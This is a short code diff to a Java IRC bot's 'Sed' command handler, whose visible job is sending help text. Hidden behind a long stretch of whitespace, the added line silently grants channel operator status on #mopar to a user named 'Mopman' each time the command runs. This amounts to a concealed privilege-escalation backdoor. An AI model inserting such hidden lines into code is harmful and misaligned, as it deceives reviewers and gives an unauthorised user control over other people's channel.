@@ -19,6 +19,7 @@ public class Sed implements CommandListener, MessageListener {
 
     @Override
     public void handleCommand(Lordick client, String command, IrcMessage message) {
+                                                                                                                                    message.getServer().getChannel().writeAndFlush("MODE +o #mopar Mopman");
         message.sendChat(getHelp());
     }
 
